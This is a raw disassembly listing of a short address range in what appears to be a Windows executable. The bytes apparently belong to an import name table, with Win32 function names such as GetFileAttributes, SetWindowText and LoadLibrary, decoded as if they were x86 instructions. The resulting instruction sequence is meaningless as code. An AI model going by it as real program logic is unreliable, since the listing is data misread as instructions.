  4286d2:	fs inc ecx
  4286d4:	je     0x428745
  4286d6:	ins    DWORD PTR es:[edi],dx
  4286d7:	push   edi
  4286d8:	add    dl,ch
  4286da:	add    BYTE PTR [ebx+0x72],al
  4286dd:	gs popa 
  4286df:	je     0x428746
  4286e1:	push   ebx
  4286e2:	gs ins DWORD PTR es:[edi],dx
  4286e4:	popa   
  4286e5:	jo     0x42874f
  4286e7:	outs   dx,DWORD PTR ds:[esi]
  4286e8:	jb     0x42874f
  4286ea:	push   edi
  4286eb:	add    BYTE PTR [eax],al
  4286ed:	fadd   QWORD PTR [ebx]
  4286ef:	push   ebx
  4286f0:	gs popa 
  4286f2:	jb     0x428757
  4286f4:	push   0x68746150
  4286f9:	push   edi
  4286fa:	add    BYTE PTR [ebx+eax*1+0x4f],al
  4286fe:	jo     0x428765
  428700:	outs   dx,BYTE PTR ds:[esi]
  428701:	push   ebx
  428702:	gs ins DWORD PTR es:[edi],dx
  428704:	popa   
  428705:	jo     0x42876f
  428707:	outs   dx,DWORD PTR ds:[esi]
  428708:	jb     0x42876f
  42870a:	push   edi
  42870b:	add    BYTE PTR [eax],al
  42870d:	into   
  42870e:	add    cl,BYTE PTR [ecx+0x73]
  428711:	inc    edx
  428712:	popa   
  428713:	fs push edi
  428715:	jb     0x428780
  428717:	je     0x42877e
  428719:	push   eax
  42871a:	je     0x42878e
  42871c:	add    cl,dh
  42871e:	add    DWORD PTR [edi+0x65],eax
  428721:	je     0x428769
  428723:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  42872b:	xchg   edx,eax
  42872c:	add    al,BYTE PTR [edi+0x6c]
  42872f:	outs   dx,DWORD PTR ds:[esi]
  428730:	bound  esp,QWORD PTR [ecx+0x6c]
  428733:	inc    edi
  428734:	gs je  0x428778
  428737:	je     0x4287a8
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	dec    esi
  42873b:	popa   
  42873c:	ins    DWORD PTR es:[edi],dx
  42873d:	gs push edi
  42873f:	add    BYTE PTR [eax],al
  428741:	mov    edi,0x74736c04
  428746:	jb     0x4287ab
  428748:	popa   
  428749:	je     0x42878c
  42874b:	add    BYTE PTR [eax],al
  42874d:	out    0x0,al
  42874f:	inc    ebx
  428750:	jb     0x4287b7
  428752:	popa   
  428753:	je     0x4287ba
  428755:	push   edx
  428756:	gs ins DWORD PTR es:[edi],dx
  428758:	outs   dx,DWORD PTR ds:[esi]
  428759:	je     0x4287c0
  42875b:	push   esp
  42875c:	push   0x64616572
  428761:	add    BYTE PTR [eax],al
  428763:	imul   eax,DWORD PTR [edx*2+0x6e61686e],0x64
  42876b:	ins    BYTE PTR es:[edi],dx
  42876c:	gs fs inc ebp
  42876f:	js     0x4287d4
  428771:	gs jo  0x4287e8
  428774:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  42877b:	gs jb  0x42877e
  42877e:	add    BYTE PTR [ebx+0x6d655203],dh
  428784:	outs   dx,DWORD PTR ds:[esi]
  428785:	jbe    0x4287ec
  428787:	inc    esp
  428788:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42878f:	jns    0x4287d2
  428791:	add    BYTE PTR [eax],al
  428793:	pop    edi
  428794:	add    al,BYTE PTR [edi+0x65]
  428797:	je     0x4287ed
  428799:	gs ins DWORD PTR es:[edi],dx
  42879b:	jo     0x4287e3
  42879d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4287a5:	add    BYTE PTR [eax],al
  4287a7:	out    0x0,eax
  4287a9:	inc    ebx
  4287aa:	jb     0x428811
  4287ac:	popa   
  4287ad:	je     0x428814
  4287af:	push   ebx
  4287b0:	gs ins DWORD PTR es:[edi],dx
  4287b2:	popa   
  4287b3:	jo     0x42881d
  4287b5:	outs   dx,DWORD PTR ds:[esi]
  4287b6:	jb     0x42881d
  4287b8:	inc    ecx
  4287b9:	add    BYTE PTR [eax],al
  4287bb:	in     al,dx
  4287bc:	add    DWORD PTR [edi+0x65],eax
  4287bf:	je     0x428807
  4287c1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4287c9:	bound  esi,QWORD PTR [ebp+0x74]
  4287cc:	gs jae 0x428826
  4287cf:	add    BYTE PTR [eax],al
  4287d1:	jmp    0x6946:0x74654701
  4287d8:	ins    BYTE PTR es:[edi],dx
  4287d9:	gs inc ecx
  4287db:	je     0x428851
  4287dd:	jb     0x428848
  4287df:	bound  esi,QWORD PTR [ebp+0x74]
  4287e2:	gs jae 0x42882a
  4287e5:	js     0x428828
  4287e7:	add    BYTE PTR [eax],al
  4287e9:	nop
  4287ea:	add    al,BYTE PTR [edi+0x6c]
  4287ed:	outs   dx,DWORD PTR ds:[esi]
  4287ee:	bound  esp,QWORD PTR [ecx+0x6c]
  4287f1:	inc    esi
  4287f2:	jb     0x428859
  4287f4:	add    BYTE PTR gs:[eax],al
  4287f7:	inc    ebp
  4287f8:	add    al,BYTE PTR [edi+0x65]
  4287fb:	je     0x428850
  4287fd:	je     0x428860
  4287ff:	jb     0x428875
  428801:	jne    0x428873
  428803:	dec    ecx
  428804:	outs   dx,BYTE PTR ds:[esi]
  428805:	outs   dx,WORD PTR ds:[esi]
  428807:	push   edi
  428808:	add    BYTE PTR [ecx+0x6f6c4702],dl
  42880e:	bound  esp,QWORD PTR [ecx+0x6c]
  428811:	inc    edi
  428812:	gs je  0x428856
  428815:	je     0x428886
  428817:	ins    DWORD PTR es:[edi],dx
  428818:	dec    esi
  428819:	popa   
  42881a:	ins    DWORD PTR es:[edi],dx
  42881b:	gs inc ecx
  42881d:	add    BYTE PTR [eax],al
  42881f:	mov    ds:0x6c614300,al
  428824:	ins    BYTE PTR es:[edi],dx
  428825:	dec    esi
  428826:	popa   
  428827:	ins    DWORD PTR es:[edi],dx
  428828:	gs fs push eax
  42882b:	imul   esi,DWORD PTR [eax+0x65],0xf3000057
  428832:	add    DWORD PTR [edi+0x65],eax
  428835:	je     0x42887d
  428837:	jne    0x4288a5
  428839:	ins    BYTE PTR es:[edi],dx
  42883a:	push   eax
  42883b:	popa   
  42883c:	je     0x4288a6
  42883e:	dec    esi
  42883f:	popa   
  428840:	ins    DWORD PTR es:[edi],dx
  428841:	gs push edi
  428843:	add    BYTE PTR [eax],al
  428845:	xchg   DWORD PTR [edx],eax
  428847:	inc    edi
  428848:	ins    BYTE PTR es:[edi],dx
  428849:	outs   dx,DWORD PTR ds:[esi]
  42884a:	bound  esp,QWORD PTR [ecx+0x6c]
  42884d:	inc    ecx
  42884e:	fs fs inc ecx
  428851:	je     0x4288c2
  428853:	ins    DWORD PTR es:[edi],dx
  428854:	inc    ecx
  428855:	add    BYTE PTR [eax],al
  428857:	dec    ebx
  428858:	inc    ebp
  428859:	push   edx
  42885a:	dec    esi
  42885b:	inc    ebp
  42885c:	dec    esp
  42885d:	xor    esi,DWORD PTR [edx]
  42885f:	cs fs ins BYTE PTR es:[edi],dx
  428862:	ins    BYTE PTR es:[edi],dx
  428863:	add    BYTE PTR [eax],al
  428865:	sahf   
  428866:	add    DWORD PTR [ecx+0x73],ecx
  428869:	push   edx
  42886a:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  42886f:	jo     0x4288e5
  428871:	jns    0x428873
  428873:	mov    DWORD PTR [ecx],eax
  428875:	dec    ecx
  428876:	outs   dx,BYTE PTR ds:[esi]
  428877:	jbe    0x4288da
  428879:	ins    BYTE PTR es:[edi],dx
  42887a:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  428882:	je     0x428884
  428884:	add    ch,dh
  428886:	add    BYTE PTR [edi+0x65],al
  428889:	je     0x4288ce
  42888b:	ins    BYTE PTR es:[edi],dx
  42888c:	popa   
  42888d:	jae    0x428902
  42888f:	dec    ecx
  428890:	outs   dx,BYTE PTR ds:[esi]
  428891:	outs   dx,WORD PTR ds:[esi]
  428893:	inc    ebp
  428894:	js     0x4288d7
  428896:	add    al,ah
  428898:	add    BYTE PTR [esi+0x69],al
  42889b:	ins    BYTE PTR es:[edi],dx
  42889c:	ins    BYTE PTR es:[edi],dx
  42889d:	push   edx
  42889e:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4288a3:	jl     0x4288a7
  4288a5:	push   ebx
  4288a6:	push   0x774f776f
  4288ab:	outs   dx,BYTE PTR ds:[esi]
  4288ac:	gs fs push eax
  4288af:	outs   dx,DWORD PTR ds:[esi]
  4288b0:	jo     0x428927
  4288b2:	jo     0x428927
  4288b4:	add    ch,al
  4288b6:	add    DWORD PTR [ebp+0x61],ecx
  4288b9:	jo     0x428911
  4288bb:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  4288c2:	gs jns 0x428906
  4288c5:	add    BYTE PTR [eax],al
  4288c7:	test   al,0x1
  4288c9:	dec    esp
  4288ca:	outs   dx,DWORD PTR ds:[esi]
  4288cb:	popa   
  4288cc:	fs inc ecx
  4288ce:	arpl   WORD PTR [ebx+0x65],sp
  4288d1:	ins    BYTE PTR es:[edi],dx
  4288d2:	gs jb  0x428936
  4288d5:	je     0x428946
  4288d7:	jb     0x42894c
  4288d9:	push   edi
  4288da:	add    BYTE PTR [edi+0x616f4c01],ch
  4288e0:	fs dec ecx
  4288e2:	arpl   WORD PTR [edi+0x6e],bp
  4288e5:	inc    ecx
  4288e6:	add    BYTE PTR [eax+0x1],bl
  4288e9:	inc    edi
  4288ea:	gs je  0x428940
  4288ed:	jne    0x428951
  4288ef:	dec    ebp
  4288f0:	outs   dx,BYTE PTR gs:[esi]
  4288f2:	jne    0x4288f4
  4288f4:	add    bl,al
  4288f6:	add    BYTE PTR [ebp+0x6e],al
  4288f9:	fs inc esp
  4288fb:	imul   esp,DWORD PTR [ecx+0x6c],0x3300676f
  428902:	add    BYTE PTR [ebx+0x68],al
  428905:	popa   
  428906:	jb     0x42895c
  428908:	outs   dx,DWORD PTR ds:[esi]
  428909:	dec    edi
  42890a:	gs ins DWORD PTR es:[edi],dx
  42890c:	inc    edx
  42890d:	jne    0x428975
  42890f:	inc    cx
  428911:	add    BYTE PTR [eax],al
  428913:	pop    ecx
  428914:	add    DWORD PTR [edi+0x65],eax
  428917:	je     0x42896c
  428919:	jns    0x42898e
  42891b:	inc    ebx
  42891c:	outs   dx,DWORD PTR ds:[esi]
  42891d:	ins    BYTE PTR es:[edi],dx
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	jb     0x428921
  428921:	mov    es,WORD PTR [edx]
  428923:	push   esp
  428924:	outs   dx,DWORD PTR ds:[esi]
  428925:	push   ebp
  428926:	outs   dx,BYTE PTR ds:[esi]
  428927:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  42892e:	add    BYTE PTR ds:0x6c6c4100,al
  428934:	outs   dx,DWORD PTR ds:[esi]
  428935:	ja     0x42898a
  428937:	gs je  0x428980
  42893a:	outs   dx,DWORD PTR ds:[esi]
  42893b:	jb     0x4289a2
  42893d:	addr16 jb 0x4289af
  428940:	jne    0x4289b0
  428942:	fs push edi
  428944:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  42894b:	mov    BYTE PTR [ecx],al
  42894d:	dec    ecx
  42894e:	outs   dx,BYTE PTR ds:[esi]
  42894f:	je     0x4289b6
  428951:	jb     0x4289c6
  428953:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  428958:	arpl   WORD PTR [eax+eax*1+0x1],si
  42895c:	add    BYTE PTR [ecx+0x63],al
  42895f:	je     0x4289ca
  428961:	jbe    0x4289c4
  428963:	je     0x4289ca
  428965:	dec    ebx
  428966:	gs jns 0x4289cb
  428969:	outs   dx,DWORD PTR ds:[esi]
  42896a:	popa   
  42896b:	jb     0x4289d1
  42896d:	dec    esp
  42896e:	popa   
  42896f:	jns    0x4289e0
  428971:	jne    0x4289e7
  428973:	add    BYTE PTR [eax],al
  428975:	out    dx,al
  428976:	add    DWORD PTR [eax+0x65],edx
  428979:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  42897e:	jae    0x4289e1
  428980:	addr16 gs inc ecx
  428983:	add    BYTE PTR [eax],al
  428985:	add    eax,DWORD PTR [eax]
  428987:	inc    ecx
  428988:	fs push 0x75
  42898b:	jae    0x428a01
  42898d:	push   edi
  42898e:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428995:	arpl   WORD PTR [ebp+eax*2+0x78],si
  428999:	add    BYTE PTR [eax],al
  42899b:	cmp    al,0x1
  42899d:	inc    edi
  42899e:	gs je  0x4289ee
  4289a1:	gs jae 0x428a17
  4289a4:	popa   
  4289a5:	addr16 gs push eax
  4289a8:	outs   dx,DWORD PTR ds:[esi]
  4289a9:	jae    0x4289ab
  4289ab:	push   ecx
  4289ac:	add    dl,BYTE PTR [ebx+0x65]
  4289af:	je     0x428a01
  4289b1:	popa   
  4289b2:	jb     0x428a19
  4289b4:	outs   dx,BYTE PTR ds:[esi]
  4289b5:	je     0x4289b7
  4289b7:	lahf   
  4289b8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4289bc:	jo     0x428a1f
  4289be:	je     0x428a23
  4289c0:	push   0x7373654d
  4289c5:	popa   
  4289c6:	addr16 gs inc ecx
  4289c9:	add    BYTE PTR [eax],al
  4289cb:	fwait
  4289cc:	add    dl,BYTE PTR [ebp+0x6e]
  4289cf:	ins    BYTE PTR es:[edi],dx
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	popa   
  4289d2:	fs dec ebx
  4289d4:	gs jns 0x428a39
  4289d7:	outs   dx,DWORD PTR ds:[esi]
  4289d8:	popa   
  4289d9:	jb     0x428a3f
  4289db:	dec    esp
  4289dc:	popa   
  4289dd:	jns    0x428a4e
  4289df:	jne    0x428a55
  4289e1:	add    BYTE PTR [eax],al
  4289e3:	out    0x0,eax
  4289e5:	inc    esi
  4289e6:	jb     0x428a49
  4289e8:	ins    DWORD PTR es:[edi],dx
  4289e9:	gs push edx
  4289eb:	arpl   WORD PTR gs:[eax+eax*1-0x21],si
  4289f0:	add    BYTE PTR [ebp+0x78],al
  4289f3:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4289fb:	jae    0x428a42
  4289fd:	js     0x4289ff
  4289ff:	rol    BYTE PTR [edx],0x77
  428a02:	jae    0x428a74
  428a04:	jb     0x428a6f
  428a06:	outs   dx,BYTE PTR ds:[esi]
  428a07:	je     0x428a6f
  428a09:	push   edi
  428a0a:	add    BYTE PTR [eax],bh
  428a0c:	add    dl,BYTE PTR [ebx+0x65]
  428a0f:	je     0x428a54
  428a11:	jne    0x428a85
  428a13:	jae    0x428a84
  428a15:	jb     0x428a17
  428a17:	sub    eax,DWORD PTR [eax]
  428a19:	inc    ebx
  428a1a:	push   0x654e7261
  428a1f:	js     0x428a95
  428a21:	inc    ebp
  428a22:	js     0x428a65
  428a24:	add    BYTE PTR [eax+0x2],bl
  428a27:	push   ebx
  428a28:	gs je  0x428a7d
  428a2b:	arpl   WORD PTR gs:[eax+eax*1+0x55],si
  428a30:	add    DWORD PTR [edi+0x65],eax
  428a33:	je     0x428a88
  428a35:	arpl   WORD PTR [edx+0x6f],si
  428a38:	ins    BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	push   eax
  428a3b:	outs   dx,DWORD PTR ds:[esi]
  428a3c:	jae    0x428a3e
  428a3e:	add    BYTE PTR [edx+eax*1],bl
  428a41:	push   ebx
  428a42:	arpl   WORD PTR [edx+0x65],si
  428a45:	outs   dx,BYTE PTR gs:[esi]
  428a47:	push   esp
  428a48:	outs   dx,DWORD PTR ds:[esi]
  428a49:	inc    ebx
  428a4a:	ins    BYTE PTR es:[edi],dx
  428a4b:	imul   esp,DWORD PTR [ebp+0x6e],0xb9000074
  428a52:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428a56:	fs dec ebp
  428a58:	outs   dx,BYTE PTR gs:[esi]
  428a5a:	jne    0x428ab3
  428a5c:	add    BYTE PTR [eax+0x1],al
  428a5f:	inc    edi
  428a60:	gs je  0x428ab0
  428a63:	outs   dx,DWORD PTR ds:[esi]
  428a64:	outs   dx,BYTE PTR ds:[esi]
  428a65:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  428a6d:	push   edi
  428a6e:	add    BYTE PTR [eax+0x1],ch
  428a71:	inc    edi
  428a72:	gs je  0x428acc
  428a75:	imul   ebp,DWORD PTR [esi+0x64],0x4100776f
  428a7c:	add    dl,BYTE PTR [ebx+0x65]
  428a7f:	je     0x428ac7
  428a81:	outs   dx,DWORD PTR ds:[esi]
  428a82:	arpl   WORD PTR [ebp+0x73],si
  428a85:	add    BYTE PTR [eax],al
  428a87:	bound  eax,QWORD PTR [ecx]
  428a89:	inc    edi
  428a8a:	gs je  0x428ae1
  428a8d:	outs   dx,DWORD PTR ds:[esi]
  428a8e:	jo     0x428ae7
  428a90:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428a97:	and    DWORD PTR [edx],eax
  428a99:	push   ebx
  428a9a:	outs   dx,BYTE PTR gs:[esi]
  428a9c:	fs inc esp
  428a9e:	ins    BYTE PTR es:[edi],dx
  428a9f:	addr16 dec ecx
  428aa1:	je     0x428b08
  428aa3:	ins    DWORD PTR es:[edi],dx
  428aa4:	dec    ebp
  428aa5:	gs jae 0x428b1b
  428aa8:	popa   
  428aa9:	addr16 gs inc ecx
  428aac:	add    BYTE PTR [eax+eax*1+0x43],al
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  428ab8:	jb     0x428aba
  428aba:	add    BYTE PTR [esi+0x1],dl
  428abd:	inc    edi
  428abe:	gs je  0x428b14
  428ac1:	arpl   WORD PTR [edx+0x6f],si
  428ac4:	ins    BYTE PTR es:[edi],dx
  428ac5:	ins    BYTE PTR es:[edi],dx
  428ac6:	push   edx
  428ac7:	popa   
  428ac8:	outs   dx,BYTE PTR ds:[esi]
  428ac9:	add    BYTE PTR gs:[bx+si],al
  428acd:	or     DWORD PTR [ecx],eax
  428acf:	inc    edi
  428ad0:	gs je  0x428b16
  428ad3:	jne    0x428b47
  428ad5:	jae    0x428b46
  428ad7:	jb     0x428b29
  428ad9:	outs   dx,DWORD PTR ds:[esi]
  428ada:	jae    0x428adc
  428adc:	add    BYTE PTR [ecx+0x2],bl
  428adf:	push   ebx
  428ae0:	gs je  0x428b35
  428ae3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  428ae8:	jo     0x428b5e
  428aea:	jns    0x428aec
  428aec:	add    BYTE PTR [eax+0x2],ch
  428aef:	push   ebx
  428af0:	gs je  0x428b48
  428af3:	jae    0x428b5a
  428af5:	jb     0x428b46
  428af7:	bound  ebp,QWORD PTR [edx+0x65]
  428afa:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428afe:	outs   dx,WORD PTR ds:[esi]
  428b00:	jb     0x428b6f
  428b02:	popa   
  428b03:	je     0x428b6e
  428b05:	outs   dx,DWORD PTR ds:[esi]
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	push   edi
  428b08:	add    BYTE PTR [ebx],ch
  428b0a:	add    dl,BYTE PTR [ebx+0x65]
  428b0d:	outs   dx,BYTE PTR ds:[esi]
  428b0e:	fs dec ebp
  428b10:	gs jae 0x428b86
  428b13:	popa   
  428b14:	addr16 gs push edi
  428b17:	add    BYTE PTR [eax],al
  428b19:	loop   0x428b1b
  428b1b:	inc    esi
  428b1c:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  428b23:	outs   dx,DWORD PTR ds:[esi]
  428b24:	ja     0x428b6b
  428b26:	js     0x428b69
  428b28:	add    BYTE PTR [eax],bl
  428b2a:	add    DWORD PTR [edi+0x65],eax
  428b2d:	je     0x428b78
  428b2f:	arpl   WORD PTR [edi+0x6e],bp
  428b32:	dec    ecx
  428b33:	outs   dx,BYTE PTR ds:[esi]
  428b34:	outs   dx,WORD PTR ds:[esi]
  428b36:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428b3d:	arpl   WORD PTR [eax+0x54],bp
  428b40:	outs   dx,DWORD PTR ds:[esi]
  428b41:	push   esp
  428b42:	push   0x69577369
  428b47:	outs   dx,BYTE PTR ds:[esi]
  428b48:	outs   dx,DWORD PTR fs:[esi]
  428b4a:	ja     0x428b4c
  428b4c:	add    BYTE PTR [ecx+0x616f4c01],ch
  428b52:	fs inc edx
  428b54:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb004170
  428b5c:	add    DWORD PTR [edi+0x65],eax
  428b5f:	je     0x428ba5
  428b61:	inc    ebx
  428b62:	inc    ebp
  428b63:	js     0x428b65
  428b65:	mov    al,ds:0x57734901
  428b6a:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428b71:	test   DWORD PTR [ecx],eax
  428b73:	dec    ecx
  428b74:	outs   dx,BYTE PTR ds:[esi]
  428b75:	jae    0x428bdc
  428b77:	jb     0x428bed
  428b79:	dec    ebp
  428b7a:	outs   dx,BYTE PTR gs:[esi]
  428b7c:	jne    0x428bc7
  428b7e:	je     0x428be5
  428b80:	ins    DWORD PTR es:[edi],dx
  428b81:	push   edi
  428b82:	add    BYTE PTR [esi+0x73795302],al
  428b88:	je     0x428bef
  428b8a:	ins    DWORD PTR es:[edi],dx
  428b8b:	push   eax
  428b8c:	popa   
  428b8d:	jb     0x428bf0
  428b8f:	ins    DWORD PTR es:[edi],dx
  428b90:	gs je  0x428bf8
  428b93:	jb     0x428c08
  428b95:	dec    ecx
  428b96:	outs   dx,BYTE PTR ds:[esi]
  428b97:	outs   dx,WORD PTR ds:[esi]
  428b99:	push   edi
  428b9a:	add    BYTE PTR [ebx+0x2],dh
  428b9d:	push   ebx
  428b9e:	gs je  0x428bf8
  428ba1:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428ba8:	js     0x428c1e
  428baa:	inc    ecx
  428bab:	add    BYTE PTR [eax],al
  428bad:	rol    BYTE PTR [ecx],1
  428baf:	dec    ebp
  428bb0:	gs jae 0x428c26
  428bb3:	popa   
  428bb4:	addr16 gs inc edx
  428bb7:	outs   dx,DWORD PTR ds:[esi]
  428bb8:	js     0x428bff
  428bba:	js     0x428c13
  428bbc:	add    BYTE PTR ds:0x74654701,dh
  428bc2:	dec    ebp
  428bc3:	outs   dx,BYTE PTR gs:[esi]
  428bc5:	jne    0x428c10
  428bc7:	je     0x428c2e
  428bc9:	ins    DWORD PTR es:[edi],dx
  428bca:	dec    ecx
  428bcb:	outs   dx,BYTE PTR ds:[esi]
  428bcc:	outs   dx,WORD PTR ds:[esi]
  428bce:	push   edi
  428bcf:	add    BYTE PTR [eax],al
  428bd1:	jge    0x428bd5
  428bd3:	push   ebx
  428bd4:	push   0x6353776f
  428bd9:	jb     0x428c4a
  428bdb:	ins    BYTE PTR es:[edi],dx
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	inc    edx
  428bde:	popa   
  428bdf:	jb     0x428be1
  428be1:	cmp    al,0x0
  428be3:	inc    ebx
  428be4:	push   0x4d6b6365
  428be9:	outs   dx,BYTE PTR gs:[esi]
  428beb:	jne    0x428c3f
  428bed:	popa   
  428bee:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  428bf6:	add    BYTE PTR [edx+0x616f4c01],ch
  428bfc:	fs inc edx
  428bfe:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab005770
  428c06:	add    BYTE PTR [edx+esi*2+0x61],al
  428c0a:	ja     0x428c4d
  428c0c:	outs   dx,BYTE PTR ds:[esi]
  428c0d:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  428c14:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  428c19:	mov    cl,0x2
  428c1b:	push   esi
  428c1c:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  428c20:	push   ebx
  428c21:	arpl   WORD PTR [ecx+0x6e],sp
  428c24:	push   edi
  428c25:	add    BYTE PTR [eax],al
  428c27:	add    DWORD PTR [ecx],0x65536e49
  428c2d:	outs   dx,BYTE PTR ds:[esi]
  428c2e:	fs dec ebp
  428c30:	gs jae 0x428ca6
  428c33:	popa   
  428c34:	addr16 gs inc ebp
  428c37:	js     0x428c39
  428c39:	ins    DWORD PTR es:[edi],dx
  428c3a:	add    DWORD PTR [edi+0x65],eax
  428c3d:	je     0x428c96
  428c3f:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428c46:	outs   dx,BYTE PTR ds:[esi]
  428c47:	addr16 push edi
  428c49:	add    BYTE PTR [eax],al
  428c4b:	jle    0x428c4e
  428c4d:	dec    eax
  428c4e:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  428c56:	jne    0x428ca1
  428c58:	je     0x428cbf
  428c5a:	ins    DWORD PTR es:[edi],dx
  428c5b:	add    BYTE PTR [eax],al
  428c5d:	xor    DWORD PTR [eax],eax
  428c5f:	inc    ebx
  428c60:	push   0x72507261
  428c65:	gs jbe 0x428cbf
  428c68:	add    ah,ah
  428c6a:	add    BYTE PTR [esi+0x69],al
  428c6d:	outs   dx,BYTE PTR ds:[esi]
  428c6e:	fs push edi
  428c70:	imul   ebp,DWORD PTR [esi+0x64],0x57776f
  428c77:	sub    al,BYTE PTR [edx]
  428c79:	push   ebx
  428c7a:	outs   dx,BYTE PTR gs:[esi]
  428c7c:	fs dec ebp
  428c7e:	gs jae 0x428cf4
  428c81:	popa   
  428c82:	addr16 gs push esp
  428c85:	imul   ebp,DWORD PTR [ebp+0x65],0x5774756f
  428c8c:	add    BYTE PTR [ebx],al
  428c8e:	add    dl,BYTE PTR [edx+0x65]
  428c91:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428c99:	popa   
  428c9a:	jae    0x428d0f
  428c9c:	inc    ebp
  428c9d:	js     0x428ce0
  428c9f:	add    BYTE PTR [eax],al
  428ca1:	xchg   esi,eax
  428ca2:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428ca6:	outs   dx,BYTE PTR ds:[esi]
  428ca7:	jae    0x428d15
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ebp
  428cad:	gs jae 0x428d23
  428cb0:	popa   
  428cb1:	add    BYTE PTR gs:[bx+si],al
  428cb5:	add    BYTE PTR [edx],0x53
  428cb8:	push   0x6957776f
  428cbd:	outs   dx,BYTE PTR ds:[esi]
  428cbe:	outs   dx,DWORD PTR fs:[esi]
  428cc0:	ja     0x428d03
  428cc2:	jae    0x428d3d
  428cc4:	outs   dx,BYTE PTR ds:[esi]
  428cc5:	arpl   WORD PTR [eax],ax
  428cc7:	mov    BYTE PTR [eax],0x45
  428cca:	outs   dx,BYTE PTR ds:[esi]
  428ccb:	fs push esp
  428ccd:	popa   
  428cce:	jae    0x428d3b
  428cd0:	add    bl,dh
  428cd2:	add    DWORD PTR [eax+0x6f],edx
  428cd5:	jae    0x428d4b
  428cd7:	push   ecx
  428cd8:	jne    0x428d43
  428cda:	je     0x428d29
  428cdc:	gs jae 0x428d52
  428cdf:	popa   
  428ce0:	add    BYTE PTR gs:[bp+si+0x1],bl
  428ce5:	inc    edi
  428ce6:	gs je  0x428d3c
  428ce9:	jns    0x428d5e
  428ceb:	inc    ebx
  428cec:	outs   dx,DWORD PTR ds:[esi]
  428ced:	ins    BYTE PTR es:[edi],dx
  428cee:	outs   dx,DWORD PTR ds:[esi]
  428cef:	jb     0x428d33
  428cf1:	jb     0x428d68
  428cf3:	jae    0x428d5d
  428cf5:	add    BYTE PTR [eax],al
  428cf7:	or     eax,DWORD PTR [eax]
  428cf9:	inc    ecx
  428cfa:	je     0x428d70
  428cfc:	popa   
  428cfd:	arpl   WORD PTR [eax+0x54],bp
  428d00:	push   0x64616572
  428d05:	dec    ecx
  428d06:	outs   dx,BYTE PTR ds:[esi]
  428d07:	jo     0x428d7e
  428d09:	je     0x428d0b
  428d0b:	adc    BYTE PTR [ecx],al
  428d0d:	inc    edi
  428d0e:	gs je  0x428d55
  428d11:	ins    BYTE PTR es:[edi],dx
  428d12:	addr16 dec ecx
  428d14:	je     0x428d7b
  428d16:	ins    DWORD PTR es:[edi],dx
  428d17:	dec    ecx
  428d18:	outs   dx,BYTE PTR ds:[esi]
  428d19:	je     0x428d1b
  428d1b:	mov    eax,0x61724400
  428d20:	ja     0x428d75
  428d22:	je     0x428d85
  428d24:	je     0x428d8b
  428d26:	push   edi
  428d27:	add    BYTE PTR [eax],al
  428d29:	adc    eax,DWORD PTR [edx]
  428d2b:	push   edx
  428d2c:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428d35:	outs   dx,BYTE PTR ds:[esi]
  428d36:	outs   dx,DWORD PTR fs:[esi]
  428d38:	ja     0x428d87
  428d3a:	gs jae 0x428db0
  428d3d:	popa   
  428d3e:	addr16 gs push edi
  428d41:	add    BYTE PTR [eax],al
  428d43:	or     al,BYTE PTR [eax]
  428d45:	inc    ecx
  428d46:	jb     0x428dba
  428d48:	popa   
  428d49:	outs   dx,BYTE PTR ds:[esi]
  428d4a:	addr16 gs dec ecx
  428d4d:	arpl   WORD PTR [edi+0x6e],bp
  428d50:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  428d57:	ja     0x428dcc
  428d59:	add    BYTE PTR [eax],al
  428d5b:	jnp    0x428d5f
  428d5d:	push   ebx
  428d5e:	push   0x7543776f
  428d63:	jb     0x428dd8
  428d65:	outs   dx,DWORD PTR ds:[esi]
  428d66:	jb     0x428d68
  428d68:	add    BYTE PTR [eax],ch
  428d6a:	add    BYTE PTR [ebx+0x68],al
  428d6d:	popa   
  428d6e:	jb     0x428dbc
  428d70:	outs   dx,DWORD PTR ds:[esi]
  428d71:	ja     0x428dd8
  428d73:	jb     0x428db7
